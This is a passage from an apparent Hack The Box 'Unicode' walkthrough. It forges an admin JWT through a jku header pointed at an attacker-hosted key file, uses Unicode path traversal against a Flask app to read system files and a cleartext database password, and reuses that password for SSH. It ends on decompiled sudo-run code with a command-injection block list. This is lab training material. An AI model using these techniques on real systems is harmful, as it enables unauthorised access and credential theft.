+</code></pre></div><p>And check the JWT token:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb/dashboard/ -H <span class=code-dark-yellow>'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM'</span>  
+jku validation failed
+</code></pre></div><p>It is still invalid (and no request received). Let&rsquo;s compare the legitimate value for the <code>jku</code> and the one we are using:</p><ul><li><code>http://hackmedia.htb/static/jwks.json</code>: Valid</li><li><code>http://hackmedia.htb/redirect/?url=10.10.17.44/jwks.json</code>: Invalid</li></ul><p>There is another chance, and that is using directory traversal to have the <code>jku</code> starting with <code>http://hackmedia.htb/static/</code> and be able to access <code>/redirect/</code>. Namely, we must try:</p><ul><li><code>http://hackmedia.htb/static/jwks.json</code>: Valid</li><li><code>http://hackmedia.htb/static/../redirect/?url=10.10.17.44/jwks.json</code>: To try</li></ul><p>So, let&rsquo;s change the <code>jku</code> in the Python script again:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>+ jku = f'http://hackmedia.htb/static/../redirect?url={ip}/jwks.json'</span>  
+<span class=mtk5>- jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json'</span>
+</code></pre></div><p>And then run the script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
+[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
+</code></pre></div><p>This time there is no error message:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb/dashboard/ -H <span class=code-dark-yellow>'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s'</span>  
+&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+  &lt;!-- ... --&gt;
+&lt;/html&gt;
+</code></pre></div><p>So we have a valid forged JWT token. Moreover, there is a request on our server log:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
+[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
+10.10.11.126 - - [] "GET /jwks.json HTTP/1.1" 200 -
+</code></pre></div><p>Now we can create a forged JWT token for user <code>admin</code>. This will bring us to a different dashboard:</p><p><img src=/images/HTB/Unicode/Unicode-admin-dashboard.png alt="Unicode admin dashboard"></p><p>Notice that the Python server must be running to serve the <code>jwks.json</code>, so that the machine can retrieve it every time it needs to validate the JWT token.</p><h2 id=exploiting-a-directory-path-traversal>Exploiting a Directory Path Traversal</h2><p>On this dashboard, we can see a feature to get some PDF files (although it seems to be not finished):</p><p><img src=/images/HTB/Unicode/Unicode-dpt.png alt="Unicode PDF"></p><p>Valid files are: <code>monthly.pdf</code> and <code>quarterly.pdf</code>.</p><p>At this point we can try a common Directory Path Traversal payload and check if the server is vulnerable (namely, multiple <code>../</code> and then a file such as <code>/etc/passwd</code>):</p><p><img src=/images/HTB/Unicode/Unicode-dpt-error.png alt="Unicode DPT error"></p><p>As it can be seen, the server blocks our request. It also says that it applies some filters, challenging us to bypass them.</p><p>After trying some payloads from <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion>HackTricks</a> and <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal>PayloadsAllTheThings</a> without any interesting result, we can think of UTF-8 characters (since the machine is called Unicode).</p><p>Actually, there is a bypassing technique for Flask that uses a single Unicode character that looks similar to <code>..</code> or <code>/</code> (for example: <code>‥</code>, <code>︰</code> or <code>／</code>), and Flask parses them as two dots and a slash. More information <a href=https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html>here</a>.</p><p>We can check easily if the server is running Flask by looking at the HTTP response status message. If the message is in capital letters, it is likely to be a Flask application:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb -I
+HTTP/1.1 308 PERMANENT REDIRECT
+<span class=code-white>Server</span>: nginx/1.18.0 (Ubuntu)
+<span class=code-white>Date</span>:
+<span class=code-white>Content-Type</span>: text/html; charset=utf-8  
+<span class=code-white>Content-Length</span>: 260
+<span class=code-white>Connection</span>: keep-alive
+<span class=code-white>Location</span>: http://hackmedia.htb/login/
+</code></pre></div><p>Now that we know it is a Flask application, we can use the Unicode characters shown above to get <code>/etc/passwd</code>:</p><p><img src=/images/HTB/Unicode/Unicode-dpt1.png alt="Unicode DPT /etc/passwd"></p><p><img src=/images/HTB/Unicode/Unicode-dpt2.png alt="Unicode DPT /etc/passwd"></p><p><img src=/images/HTB/Unicode/Unicode-dpt3.png alt="Unicode DPT /etc/passwd"></p><p>The website is vulnerable to Directory Path Traversal. I decided to add this exploit to the previous Python script (using Unicode characters). The script is <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Unicode/dpt-jwks.py>dpt-jwks.py</a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Unicode#dpt-jwkspy>here</a>).</p><p>Using this script, we can read files from the server in an easy way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>dpt-jwks.py</span> 10.10.17.44
+[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
+[+] Vulnerable page: http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd
+
+dpt&gt; /etc/hosts
+
+127.0.0.1 localhost
+127.0.1.1 code
+127.0.0.1 hackmedia.htb
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div><p>As the server has an nginx (shown in the output of <code>nmap</code>), we an try to read the sites configuration:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dpt&gt; /etc/nginx/sites-enabled/default  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk7>limit_req_zone</span> <span class=mtk4>$binary_remote_addr</span> zone=mylimit:<span class=mtk6>10m</span> rate=800r/s;  
+
+<span class=mtk5>server</span>{
+<span class=mtk3># Change the Webroot from /home/code/app/ to /var/www/html/</span>
+<span class=mtk3># Change the user password from db.yaml</span>
+        <span class=mtk7>listen</span> <span class=mtk6>80</span>;
+        <span class=mtk7>error_page</span> <span class=mtk6>503</span> /rate-limited/;
+        <span class=mtk8>location</span> / {
+                <span class=mtk7>limit_req</span> zone=mylimit;
+                <span class=mtk7>proxy_pass</span> http://localhost:8000;
+                <span class=mtk7>include</span> /etc/nginx/proxy_params;
+                <span class=mtk7>proxy_redirect</span> <span class=mtk6>off</span>;
+        }
+        <span class=mtk8>location</span> /static/ {
+                <span class=mtk7>alias</span> /home/code/coder/static/styles/;
+        }
+}
+</code></pre></div><p>Here we see some interesting things:</p><ul><li>&ldquo;Change the Webroot from /home/code/app/ to /var/www/html/&rdquo;</li><li>&ldquo;Change the user password from db.yaml&rdquo;</li></ul><p>We need to find the absolute path to file <code>db.yaml</code> because it may contain clear text credentials. Using these information, we can try the following paths:</p><ul><li><code>/home/code/db.yaml</code></li><li><code>/home/code/app/db.yaml</code></li><li><code>/var/www/html/db.yaml</code></li><li><code>/home/code/coder/static/styles/db.yaml</code></li><li><code>/home/code/coder/static/db.yaml</code></li><li><code>/home/code/coder/db.yaml</code></li></ul><p>And the last one is the valid one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dpt&gt; /home/code/coder/db.yaml  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>mysql_host</span><span class=mtk1>:</span> <span class=mtk4>"localhost"</span>
+<span class=mtk5>mysql_user</span><span class=mtk1>:</span> <span class=mtk4>"code"</span>
+<span class=mtk5>mysql_password</span><span class=mtk1>:</span> <span class=mtk4>"B3stC0d3r2021@@!"</span>  
+<span class=mtk5>mysql_db</span><span class=mtk1>:</span> <span class=mtk4>"user"</span>
+</code></pre></div><p>Actually, we can also get the <code>user.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dpt&gt; /home/code/user.txt
+
+eb2b21ad20f6b9239746d35881f4e023  
+</code></pre></div><h2 id=system-enumeration>System enumeration</h2><p>The password found inside the file <code>db.yaml</code> is reused for SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> code@10.10.11.126
+code@10.10.11.126's password:  
+<span class=code-green>code@code</span>:<span class=code-blue>~</span>$
+</code></pre></div><p>User <code>code</code> is able to use <code>sudo</code> to run <code>/usr/bin/treport</code> as <code>root</code> without password (although we have it):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo -l
+Matching Defaults entries for code on code:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+
+User code may run the following commands on code:
+    (root) NOPASSWD: /usr/bin/treport
+</code></pre></div><p>This file is a compiled binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ file /usr/bin/treport
+/usr/bin/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/Linux 2.6.32, stripped  
+</code></pre></div><p>The program allows to create, read and download threat reports:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport  
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:
+</code></pre></div><p>If we interact with the program and force an exit (<code>^C</code>), we will see a <code>KeyboardInterrupt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:^CTraceback (most recent call last):
+  File "treport.py", line 67, in &lt;module&gt;
+KeyboardInterrupt
+[2177] Failed to execute script 'treport' due to unhandled exception!  
+</code></pre></div><p>This is a common exception in Python scripts. This tells us that <code>treport</code> is a Python compiled binary. Moreover, there is a reference to a file called <code>treport.py</code>.</p><h2 id=reversing-treport-to-python-code>Reversing <code>treport</code> to Python code</h2><p>To transfer the <code>treport</code> binary to our attacker machine, one could open a web server on the victim machine using Python and request the binary file using <code>wget</code> or <code>curl</code>.</p><p>To extract the byte-code (<code>.pyc</code>), we can use <a href=https://github.com/extremecoders-re/pyinstxtractor/>PyInstaller Extractor</a>. Then, with the byte-code, we can obtain the original Python script using <a href=https://pypi.org/project/uncompyle6/><code>uncompyle6</code></a> (<code>pip3 install uncompyle6</code>).</p><p>These tools require Python version 3.8. To avoid issues, this task can be done inside a Docker container:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>wget</span> -q https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>docker</span> run --rm -v <span class=code-dark-yellow>"<span class=code-dark-cyan>$PWD</span>"</span>/:/htb -it python:3.8 bash
+root@28075f8d8030:/# cd htb
+root@28075f8d8030:/htb# pip3 install uncompyle6
+...
+root@28075f8d8030:/htb# python3 pyinstxtractor.py treport
+[+] Processing treport
+[+] Pyinstaller version: 2.1+
+[+] Python version: 38
+[+] Length of package: 6798297 bytes
+[+] Found 46 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_multiprocessing.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: treport.pyc
+[+] Found 223 files in PYZ archive
+[+] Successfully extracted pyinstaller archive: treport
+
+You can now use a python decompiler on the pyc files within the extracted directory
+root@28075f8d8030:/htb# uncompyle6 treport_extracted/treport.pyc &gt; treport.py
+</code></pre></div><p>Now we are able to read the Python source code and analyze it:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">os</span><span class=mtk1>,</span> <span class="mtk8 mtku">re</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span>
+<span class=mtk5>from</span> <span class="mtk8 mtku">datetime</span> <span class=mtk5>import</span> <span class="mtk8 mtku">datetime</span>
+
+<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">threat_report</span><span class=mtk1>:</span>
+    <span class="mtk7 mtki">def</span> <span class=mtk8>create</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
+        <span class=mtk1>file_name</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>filename:'</span><span class=mtk1>)</span>
+        <span class=mtk1>content</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>report:'</span><span class=mtk1>)</span>
+        <span class=mtk5>if</span> <span class=mtk4>'../'</span> <span class=mtk5>in</span> <span class=mtk1>file_name</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'NOT</span> <span class=mtk4>ALLOWED'</span><span class=mtk1>)</span>
+            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+        <span class=mtk1>file_path</span> <span class=mtk5>=</span> <span class=mtk4>'/root/reports/'</span> <span class=mtk5>+</span> <span class=mtk1>file_name</span>
+        <span class=mtk5>with</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk1>file_path</span><span class=mtk1>,</span> <span class=mtk4>'w'</span><span class=mtk1>)</span> <span class=mtk5>as</span> <span class=mtk1>(</span><span class=mtk1>fd</span><span class=mtk1>):</span>
+            <span class=mtk1>fd</span><span class=mtk1>.</span><span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk1>content</span><span class=mtk1>)</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk8>list_files</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
+        <span class=mtk1>file_list</span> <span class=mtk5>=</span> <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>listdir</span><span class=mtk1>(</span><span class=mtk4>'/root/reports/'</span><span class=mtk1>)</span>
+        <span class=mtk1>files_in_dir</span> <span class=mtk5>=</span> <span class=mtk4>'</span> <span class=mtk4>'</span><span class=mtk1>.</span><span class=mtk8>join</span><span class=mtk1>([</span><span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class=mtk1>elem</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>elem</span> <span class=mtk5>in</span> <span class=mtk1>file_list</span><span class=mtk1>])</span>
+        <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'ALL</span> <span class=mtk4>THE</span> <span class=mtk4>THREAT</span> <span class=mtk4>REPORTS:'</span><span class=mtk1>)</span>
+        <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>files_in_dir</span><span class=mtk1>)</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk8>read_file</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
+        <span class=mtk1>file_name</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>Enter</span> <span class=mtk4>the</span> <span class=mtk4>filename:'</span><span class=mtk1>)</span>
+        <span class=mtk5>if</span> <span class=mtk4>'../'</span> <span class=mtk5>in</span> <span class=mtk1>file_name</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'NOT</span> <span class=mtk4>ALLOWED'</span><span class=mtk1>)</span>
+            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+        <span class=mtk1>contents</span> <span class=mtk5>=</span> <span class=mtk4>''</span>
+        <span class=mtk1>file_name</span> <span class=mtk5>=</span> <span class=mtk4>'/root/reports/'</span> <span class=mtk5>+</span> <span class=mtk1>file_name</span>
+        <span class=mtk5>try</span><span class=mtk1>:</span>
+            <span class=mtk5>with</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk1>file_name</span><span class=mtk1>,</span> <span class=mtk4>'r'</span><span class=mtk1>)</span> <span class=mtk5>as</span> <span class=mtk1>(</span><span class=mtk1>fd</span><span class=mtk1>):</span>
+                <span class=mtk1>contents</span> <span class=mtk5>=</span> <span class=mtk1>fd</span><span class=mtk1>.</span><span class=mtk8>read</span><span class=mtk1>()</span>
+        <span class=mtk5>except</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'SOMETHING</span> <span class=mtk4>IS</span> <span class=mtk4>WRONG'</span><span class=mtk1>)</span>
+        <span class=mtk5>else</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>contents</span><span class=mtk1>)</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk8>download</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
+        <span class=mtk1>now</span> <span class=mtk5>=</span> <span class="mtk8 mtku">datetime</span><span class=mtk1>.</span><span class=mtk8>now</span><span class=mtk1>()</span>
+        <span class=mtk1>current_time</span> <span class=mtk5>=</span> <span class=mtk1>now</span><span class=mtk1>.</span><span class=mtk8>strftime</span><span class=mtk1>(</span><span class=mtk4>'%H_%M_%S'</span><span class=mtk1>)</span>
+        <span class=mtk1>command_injection_list</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk4>'`'</span><span class=mtk1>,</span> <span class=mtk4>';'</span><span class=mtk1>,</span> <span class=mtk4>'&amp;'</span><span class=mtk1>,</span> <span class=mtk4>'|'</span><span class=mtk1>,</span> <span class=mtk4>'&gt;'</span><span class=mtk1>,</span> <span class=mtk4>'&lt;'</span><span class=mtk1>,</span> <span class=mtk4>'?'</span><span class=mtk1>,</span> <span class=mtk4>"'"</span><span class=mtk1>,</span> <span class=mtk4>'@'</span><span class=mtk1>,</span> <span class=mtk4>'#'</span><span class=mtk1>,</span> <span class=mtk4>'$'</span><span class=mtk1>,</span> <span class=mtk4>'%'</span><span class=mtk1>,</span> <span class=mtk4>'^'</span><span class=mtk1>,</span> <span class=mtk4>'('</span><span class=mtk1>,</span> <span class=mtk4>')'</span><span class=mtk1>]</span>  
+        <span class=mtk1>ip</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>IP/file_name:'</span><span class=mtk1>)</span>
+        <span class=mtk1>res</span> <span class=mtk5>=</span> <span class="mtk8 mtku">bool</span><span class=mtk1>(</span><span class="mtk8 mtku">re</span><span class=mtk1>.</span><span class=mtk8>search</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\\</span><span class=mtk4>s'</span><span class=mtk1>,</span> <span class=mtk1>ip</span><span class=mtk1>))</span>
+        <span class=mtk5>if</span> <span class=mtk1>res</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'INVALID</span> <span class=mtk4>IP'</span><span class=mtk1>)</span>
+            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+        <span class=mtk5>if</span> <span class=mtk4>'file'</span> <span class=mtk5>in</span> <span class=mtk1>ip</span> <span class=mtk5>or</span> <span class=mtk4>'gopher'</span> <span class=mtk5>in</span> <span class=mtk1>ip</span> <span class=mtk5>or</span> <span class=mtk4>'mysql'</span> <span class=mtk5>in</span> <span class=mtk1>ip</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'INVALID</span> <span class=mtk4>URL'</span><span class=mtk1>)</span>
+            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+        <span class=mtk5>for</span> <span class=mtk1>vars</span> <span class=mtk5>in</span> <span class=mtk1>command_injection_list</span><span class=mtk1>:</span>
+            <span class=mtk5>if</span> <span class=mtk1>vars</span> <span class=mtk5>in</span> <span class=mtk1>ip</span><span class=mtk1>:</span>
+                <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'NOT</span> <span class=mtk4>ALLOWED'</span><span class=mtk1>)</span>
+                <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+            <span class=mtk1>cmd</span> <span class=mtk5>=</span> <span class=mtk4>'/bin/bash</span> <span class=mtk4>-c</span> <span class=mtk4>"curl</span> <span class=mtk4>'</span> <span class=mtk5>+</span> <span class=mtk1>ip</span> <span class=mtk5>+</span> <span class=mtk4>'</span> <span class=mtk4>-o</span> <span class=mtk4>/root/reports/threat_report_'</span> <span class=mtk5>+</span> <span class=mtk1>current_time</span> <span class=mtk5>+</span> <span class=mtk4>'"'</span>
+            <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk1>cmd</span><span class=mtk1>)</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk1>obj</span> <span class=mtk5>=</span> <span class="mtk8 mtku">threat_report</span><span class=mtk1>()</span>
+    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'1.Create</span> <span class=mtk4>Threat</span> <span class=mtk4>Report.'</span><span class=mtk1>)</span>
+    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'2.Read</span> <span class=mtk4>Threat</span> <span class=mtk4>Report.'</span><span class=mtk1>)</span>
+    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'3.Download</span> <span class=mtk4>A</span> <span class=mtk4>Threat</span> <span class=mtk4>Report.'</span><span class=mtk1>)</span>
+    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'4.Quit.'</span><span class=mtk1>)</span>
+    <span class=mtk1>check</span> <span class=mtk5>=</span> <span class=mtk6>True</span>
+    <span class=mtk5>if</span> <span class=mtk1>check</span><span class=mtk1>:</span>
+        <span class=mtk1>choice</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>your</span> <span class=mtk4>choice:'</span><span class=mtk1>)</span>
+        <span class=mtk5>try</span><span class=mtk1>:</span>
+            <span class=mtk1>choice</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>choice</span><span class=mtk1>)</span>
+        <span class=mtk5>except</span><span class=mtk1>:</span>
+            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'Wrong</span> <span class=mtk4>Input'</span><span class=mtk1>)</span>
+            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+        <span class=mtk5>else</span><span class=mtk1>:</span>
+            <span class=mtk5>if</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
+                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>create</span><span class=mtk1>()</span>
+            <span class=mtk5>elif</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>:</span>
+                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>list_files</span><span class=mtk1>()</span>
+                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>read_file</span><span class=mtk1>()</span>
+            <span class=mtk5>elif</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>3</span><span class=mtk1>:</span>
+                <span class=mtk1>obj</span><span class=mtk1>.</span><span class=mtk8>download</span><span class=mtk1>()</span>
